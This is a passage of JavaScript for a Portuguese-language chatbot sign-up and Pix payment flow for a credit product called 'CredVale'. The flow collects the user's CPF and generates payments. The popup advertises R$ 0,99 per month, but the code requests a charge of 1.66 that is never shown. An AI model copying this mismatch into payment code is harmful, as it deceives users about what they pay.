              '<button class="chat-option" id="btnAcessarContaCli" style="padding:12px;font-size:0.85rem;">🔑 Acessar minha conta</button>'+
            '</div>'+
          '</div>',
          'bot'
        );
        showOptions([]);
        await new Promise(function(resolve) {
          document.getElementById('btnBaixarApp').onclick = function() {
            API.showDownloadModal({ clientId: client.id, cpf: user.cpf, nome: nome });
            resolve();
          };
          document.getElementById('btnFalarSuporte').onclick = function() {
            abrirWhatsAppVerificacao(client.id, limite, '', primeiroNome, user.cpf);
            resolve();
          };
          document.getElementById('btnAcessarContaCli').onclick = function() {
            window.location.href = '/cliente.html';
            resolve();
          };
        });
      } else {
        addMsg('Você já iniciou sua solicitação. Vamos continuar!','bot');
        await sleep(800);
        etapaCriarCredenciais(client.id, limite, 'fisico');
      }
      return true;
    } catch(e) { return false; }
  }

  /* ---- Mobile: ajustar viewport quando teclado abre ---- */
  if (window.visualViewport) {
    window.visualViewport.addEventListener('resize', function() {
      var diff = window.innerHeight - window.visualViewport.height;
      if (diff > 60) {
        // Teclado aberto: adiciona padding inferior igual a altura do teclado
        chatModal.style.paddingBottom = diff + 'px';
        scrollDown();
      } else {
        // Teclado fechado: restaura
        chatModal.style.paddingBottom = '';
      }
    });
  }
  // Quando input ganha foco, scroll suave até o input-area ficar visivel
  chatInput.addEventListener('focusin', function() {
    setTimeout(function() {
      if (chatInputArea && chatInputArea.hidden===false) {
        chatInputArea.scrollIntoView({ behavior: 'smooth', block: 'center' });
      }
    }, 100);
  });

  /* ============================================================
     FLUXO PÓS-CADASTRO: PLANO + PAGAMENTO
     ============================================================ */

  async function etapaPosCadastro(clientId, limite) {
    hideInput();
    updateProgress(8);
    flowState = 'pos-cadastro';
    await sleep(200);
    addTyping(); await sleep(600); removeTyping();

    addMsg(
      '🎉 <strong>Parabéns, '+(user.nome||'').split(' ')[0]+'!</strong><br>'+
      'Seu cadastro foi criado com sucesso.<br><br>'+
      '<div style="text-align:center;background:#f8fafc;border-radius:12px;padding:14px;margin:4px 0;">'+
        '<div style="font-size:0.82rem;color:#475569;margin-bottom:2px;">💳 Plano selecionado:</div>'+
        '<div style="font-size:1.1rem;font-weight:800;color:#0f172a;">Plano Plus</div>'+
        '<div style="font-size:1.6rem;font-weight:900;color:#0B6CF4;margin:6px 0 2px;">R$ 0,99</div>'+
        '<div style="font-size:0.75rem;color:#64748b;">por mês</div>'+
        '<div style="font-size:0.72rem;color:#94a3b8;margin-top:4px;">📉 Assinatura mensal 2014 cancele quando quiser</div>'+
      '</div>'
    );

    var decisao = await new Promise(function(resolve) {
      showOptions([
        { label:'✔ Confirmar e efetuar pagamento agora', primary:true, action:function(){ resolve('agora'); } },
        { label:'⏳ Pagar depois', action:function(){ resolve('depois'); } }
      ]);
    });

    hideInput();

    if (decisao === 'depois') {
      await etapaPagarDepois(clientId, limite);
      return;
    }

    await etapaPagamentoPix(clientId, limite);
  }

  async function etapaPagamentoPix(clientId, limite) {
    flowState = 'pagamento-pix';
    hideInput();

    var apiBase = window.__API_BASE || '/api';
    var nomePrimeiro = (user.nome||'').split(' ')[0]||'';
    var cpfLimpo = user.cpf||'00000000000';

    showPopup(
      '<div style="text-align:center;padding:4px 0;">'+
        '<div style="font-size:1.3rem;font-weight:800;color:#0f172a;margin-bottom:4px;">Pague com Pix</div>'+
        '<div style="display:flex;justify-content:space-between;background:#f8fafc;border-radius:10px;padding:10px 14px;margin:10px 0;font-size:0.85rem;"><span style="color:#475569;">Plano CredVale</span><span style="font-weight:700;color:#0B6CF4;">R$ 0,99/mês</span></div>'+
        '<div id="pixLoading" style="padding:20px 0;font-size:0.85rem;color:#64748b;">⏳ Gerando pagamento...</div>'+
        '<div id="pixContent" style="display:none;">'+
          '<div id="pixQrArea" style="background:#fff;border:2px dashed #e2e8f0;border-radius:12px;padding:12px;margin:8px 0;text-align:center;min-height:140px;display:flex;align-items:center;justify-content:center;"></div>'+
          '<div style="display:flex;gap:6px;margin-top:8px;">'+
            '<button id="btnCopiarPix" class="chat-option chat-option--primary" style="flex:1;padding:12px;font-size:0.82rem;">📋 Copiar chave Pix</button>'+
            '<button id="btnAbrirApp" class="chat-option" style="padding:12px;font-size:0.82rem;border:1.5px solid #e2e8f0;border-radius:12px;background:#fff;color:#0f172a;font-weight:700;cursor:pointer;">📱 Abrir Pix Pay</button>'+
          '</div>'+
          '<button id="btnJaPaguei" class="chat-option chat-option--primary" style="width:100%;padding:13px;font-size:0.88rem;margin-top:6px;">✔ Já efetuei o pagamento</button>'+
          '<div style="text-align:center;font-size:0.72rem;color:#94a3b8;margin-top:8px;">⏳ Aguardando confirmação de pagamento</div>'+
        '</div>'+
      '</div>'
    );

    fetch(apiBase+'/payments/generate-pix', {
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body:JSON.stringify({client_id:clientId, valor:1.66})
    }).then(function(r){ return r.json(); }).then(function(data){
      var loading = document.getElementById('pixLoading');
      var content = document.getElementById('pixContent');
      if (loading) loading.style.display = 'none';
      if (content) content.style.display = 'block';

      var qrArea = document.getElementById('pixQrArea');
      if (qrArea && data.pixQrCode) {
        qrArea.innerHTML = '<img src="'+data.pixQrCode+'" alt="QR Code Pix" style="max-width:160px;display:block;margin:0 auto;">';
      } else if (qrArea) {
        qrArea.innerHTML = '<div style="font-size:0.85rem;color:#64748b;">QR Code indisponível</div>';
      }

      var pixCode = data.pixCopiaCola || '';
      document.getElementById('btnCopiarPix').onclick = function() {
        if (pixCode) {
          navigator.clipboard.writeText(pixCode).then(function(){ addMsg('📋 Chave Pix copiada!','bot'); }).catch(function(){});
        }
      };
    }).catch(function(){
      var loading = document.getElementById('pixLoading');
      if (loading) loading.textContent = '❌ Erro ao gerar pagamento. Tente novamente.';
    });

    await new Promise(function(resolve) {
      document.getElementById('btnJaPaguei').onclick = function() {
        closePopup();
        resolve();
      };
    });

    hideInput();
    await sleep(200);
    addTyping(); await sleep(600); removeTyping();
    addMsg('⏳ <strong>Estamos verificando seu pagamento...</strong><br><br><div style="font-size:0.82rem;color:#64748b;">Seu status permanecerá como pendente até a confirmação pelo sistema.</div>');

    await sleep(300);
    showOptions([
      { label:'📲 Baixar aplicativo', primary:true, action:function(){ showDownloadModalInChat(clientId, limite); } },
      { label:'🏠 Voltar para início', action:function(){ window.location.href = '/'; } },
      { label:'💬 Falar com atendente', action:function(){ abrirWhatsAppVerificacao(clientId, limite, 1.66, user.nome, user.cpf); } },
      { label:'🔑 Acessar minha conta', action:function(){ window.location.href = '/cliente.html'; } }
    ]);
  }

  async function etapaPagarDepois(clientId, limite) {
    hideInput();
    await sleep(200);
    addTyping(); await sleep(500); removeTyping();

    addMsg(
      'Tudo bem! 😊<br><br>'+
      '<div style="background:#fff3cd;border-radius:10px;padding:10px 14px;font-size:0.82rem;color:#856404;text-align:center;border:1px solid #ffc107;">⚠️ Ativação pendente</div>'+
      '<br>Você pode finalizar seu pagamento quando quiser.'
    );

    await new Promise(function(resolve) {
      showOptions([
        { label:'📲 Baixar aplicativo', primary:true, action:function(){ showDownloadModalInChat(clientId, limite); } },
        { label:'🏠 Voltar para início', action:function(){ window.location.href = '/'; } },
        { label:'💬 Falar com atendente', action:function(){ abrirWhatsAppVerificacao(clientId, limite, 1.66, user.nome, user.cpf); } },
        { label:'🔑 Acessar minha conta', action:function(){ window.location.href = '/cliente.html'; } }
      ]);
    });
  }

  /* ---- Fullscreen: esconder barra de endereço ---- */
  if ('scrollRestoration' in window.history) window.history.scrollRestoration = 'manual';
  if (window.navigator.standalone === false && window.matchMedia('(display-mode: browser)').matches) {
    window.scrollTo(0, 1);
  }

  /* ---- Inicialização ---- */
  async function init() {
    carregarPrecos();
    carregarWhatsApp();
    await ensureSession();
    await iniciarFluxo();
  }

  if (document.readyState==='complete') init();
  else window.addEventListener('load', init);
})();
